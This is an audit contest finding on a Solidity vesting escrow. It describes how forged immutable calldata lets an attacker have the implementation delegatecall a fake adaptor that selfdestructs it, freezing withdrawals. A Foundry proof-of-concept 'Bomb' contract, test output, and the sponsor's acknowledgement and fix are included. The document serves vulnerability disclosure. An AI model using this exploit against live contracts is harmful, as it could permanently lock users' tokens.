# Issue H-1: Vaults can be bricked by `selfdestruct()`ing implementations, using forged immutable args 

Source: https://github.com/sherlock-audit/2024-01-rio-vesting-escrow-judging/issues/60 

## Found by 
0xLogos, IllIllI, fugazzi, zzykxx
## Summary

The clone-with-immutable-args pattern is unsafe to use when one of the immutable arguments controls an address being delegated to.


## Vulnerability Detail

As was seen in the Astaria beacon proxy [issue](https://x.com/apoorvlathey/status/1671308196743647232?s=20), an attacker is able to forge the calldata that the proxy normally would forward, and can cause the implementation to `selfdestruct()` itself via a `delegatecall()`. The current code has a very similar vulnerability, in that every escrow performs a `delegatecall()` to an address coming from the factory, which is a forgeable immutable argument.


## Impact

By creating a fake `IVotingAdaptor`, and providing properly-formatted calldata to the implementation contract being passed to each factory, an attacker can gain control via the `delegatecall()` in order to `selfdestruct()` each of the factories' implementations, preventing each factory's escrows from functioning further, including the withdrawal of tokens by any party.


## Code Snippet

The `factory()` function gets its value from an immutable argument:
```solidity
// File: src/VestingEscrow.sol : VestingEscrow.factory()   #1

18        /// @notice The factory that created this VestingEscrow instance.
19        function factory() public pure returns (IVestingEscrowFactory) {
20            return IVestingEscrowFactory(_getArgAddress(0));
21:       }
```
https://github.com/sherlock-audit/2024-01-rio-vesting-escrow/blob/main/rio-vesting-escrow/src/VestingEscrow.sol#L18-L21

whose subsequent [responses](https://github.com/sherlock-audit/2024-01-rio-vesting-escrow/blob/main/rio-vesting-escrow/src/VestingEscrow.sol#L234-L236) end up being used with `delegatecall()`s:
```solidity
// File: src/VestingEscrow.sol : VestingEscrow.vote()   #2

152        /// @notice Participate in a governance vote using all available tokens on the contract's balance.
153        /// @param params The ABI-encoded data for call. Can be obtained from VotingAdaptor.encodeVoteCalldata.
154        function vote(bytes calldata params) external onlyRecipient whenVotingAdaptorIsSet returns (bytes memory) {
155            return _votingAdaptor().functionDelegateCall(abi.encodeCall(IVotingAdaptor.vote, (params)));
156:       }
```
https://github.com/sherlock-audit/2024-01-rio-vesting-escrow/blob/main/rio-vesting-escrow/src/VestingEscrow.sol#L152-L156

```solidity
// File: src/adaptors/OZVotingAdaptor.sol : OZVotingAdaptor.delegate()   #3

55        /// @notice Delegate votes.
56        /// @param params The ABI-encoded delegatee address.
57        function delegate(bytes calldata params) external {
58            IVotes(votingToken).delegate(abi.decode(params, (address)));
59:       }
```
https://github.com/sherlock-audit/2024-01-rio-vesting-escrow/blob/main/rio-vesting-escrow/src/adaptors/OZVotingAdaptor.sol#L55-L59

## Tool used

Manual Review


## Recommendation

Use a state/contract variable for anything requiring being delegated to.


## PoC

Because of a [foundry bug](https://github.com/foundry-rs/foundry/issues/1543) the test is not able to show the end result of the `selfdestruct()`, so I've added a print statement
```diff
diff --git a/rio-vesting-escrow/test/VestingEscrow.t.sol b/rio-vesting-escrow/test/VestingEscrow.t.sol
index eafb7dc..55c95a8 100644
--- a/rio-vesting-escrow/test/VestingEscrow.t.sol
+++ b/rio-vesting-escrow/test/VestingEscrow.t.sol
@@ -6,6 +6,20 @@ import {IVestingEscrow} from 'src/interfaces/IVestingEscrow.sol';
 import {OZVotingAdaptor} from 'src/adaptors/OZVotingAdaptor.sol';
 import {ERC20NoReturnToken} from 'test/lib/ERC20NoReturnToken.sol';
 import {ERC20Token} from 'test/lib/ERC20Token.sol';
+import {console} from 'forge-std/Test.sol';
+
+contract Bomb {
+    function attack(address impl) external {
+        (bool success, ) = impl.call(abi.encodePacked(bytes4(keccak256("vote(bytes)")), bytes32(0), address(this), address(this), address(this), uint40(block.timestamp), uint40(block.timestamp + 1), uint40(0), uint40(1), uint16(82)));
+        require(success);
+    }
+    function votingAdaptor() external view returns (address) { return address(this); } function factory() external view returns (address) { return address(this); } function recipient() external view returns (address) { return address(this); }
+    function vote(bytes calldata) external {
+        console.log("bomb is being delegatecall()ed to; calling selfdestruct()");
+        selfdestruct(payable(address(0)));
+    }
+}
+
 
 contract VestingEscrowTest is TestUtil {
     function setUp() public {
@@ -586,9 +600,11 @@ contract VestingEscrowTest is TestUtil {
         deployedVesting.revokeAll();
     }
 
-    function testRevokeAll() public {
+    function testRevokeAllBomb() public {
         uint256 ownerBalance = token.balanceOf(factory.owner());
 
+        new Bomb().attack(address(vestingEscrowImpl));
+
         vm.prank(factory.owner());
         deployedVesting.revokeAll();
 
diff --git a/rio-vesting-escrow/test/lib/TestUtil.sol b/rio-vesting-escrow/test/lib/TestUtil.sol
index 8667ef4..68c60ec 100644
--- a/rio-vesting-escrow/test/lib/TestUtil.sol
+++ b/rio-vesting-escrow/test/lib/TestUtil.sol
@@ -39,6 +39,7 @@ contract TestUtil is Test {
     OZVotingToken public token;
 
     VestingEscrow public deployedVesting;
+    VestingEscrow public vestingEscrowImpl;
 
     uint256 public amount;
     address public recipient;
@@ -52,8 +53,9 @@ contract TestUtil is Test {
         token = new OZVotingToken();
         governor = new GovernorVotesMock(address(token));
         ozVotingAdaptor = new OZVotingAdaptor(address(governor), address(token), config.owner);
+        vestingEscrowImpl = new VestingEscrow();
         factory = new VestingEscrowFactory(
-            address(new VestingEscrow()), address(token), config.owner, config.manager, address(ozVotingAdaptor)
+            address(vestingEscrowImpl), address(token), config.owner, config.manager, address(ozVotingAdaptor)
         );
 
         vm.deal(RANDOM_GUY, 100 ether);
```

output:
```text
% forge test --match-test testRevokeAllBomb -vvv
[⠢] Compiling...
No files changed, compilation skipped

Running 1 test for test/VestingEscrow.t.sol:VestingEscrowTest
[PASS] testRevokeAllBomb() (gas: 342335)
Logs:
  bomb is being delegatecall()ed to; calling selfdestruct()

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 9.79ms
```




## Discussion

**solimander**

Acknowledged 👍 

**sherlock-admin2**

1 comment(s) were left on this issue during the judging contest.

**pratraut** commented:
> 'invalid due to owner who is deploying escrow contract is TRUSTED entity'



**solimander**

I believe this is valid. Forging of calldata variables will allow anyone to bypass protections and `selfdestruct` the implementation contract.

**solimander**

Not sure if I'm jumping the gun here, but fixed in https://github.com/rio-org/rio-vesting-escrow/pull/6

